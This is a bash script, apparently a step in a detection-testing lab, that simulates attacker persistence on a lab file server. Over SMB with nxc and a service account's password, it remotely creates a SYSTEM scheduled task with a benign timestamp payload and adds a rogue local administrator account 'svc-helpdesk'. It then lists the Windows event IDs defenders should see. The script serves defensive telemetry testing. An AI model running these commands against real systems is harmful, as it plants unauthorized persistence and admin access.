#!/usr/bin/env bash
# Step 6: Plant BENIGN persistence to generate the telemetry a real one would.
# The "payload" just writes a timestamp - no malware, no beacon, no C2.
source "$(dirname "$0")/00-config.sh"
assert_lab_target "$FS_IP"

SVC_USER="svc-backup"
SVC_PASS="${1:-Autumn2024!}"

banner "06 PERSISTENCE (benign placeholder)"
atk "T1053.005 Scheduled Task | T1136.001 Create Account: Local Account"

echo "[*] Creating a scheduled task on fs01 (benign payload: writes a timestamp)..."
TASK_CMD='schtasks /create /tn "AcmeUpdater" /tr "cmd /c echo %date% %time% >> C:\\Windows\\Temp\\upd.log" /sc hourly /ru SYSTEM /f'
nxc smb "$FS_IP" -u "$SVC_USER" -p "$SVC_PASS" -x "$TASK_CMD" || true

echo "[*] Creating a rogue local account (another common persistence move)..."
ACCT_CMD='net user svc-helpdesk Lab-Rogue-2026! /add && net localgroup Administrators svc-helpdesk /add'
nxc smb "$FS_IP" -u "$SVC_USER" -p "$SVC_PASS" -x "$ACCT_CMD" || true

expect "4698 scheduled task created ('AcmeUpdater')."
expect "4720 user account created + 4732 added to Administrators ('svc-helpdesk')."
echo "[!] CLEANUP after testing: delete task 'AcmeUpdater' and user 'svc-helpdesk' on fs01."
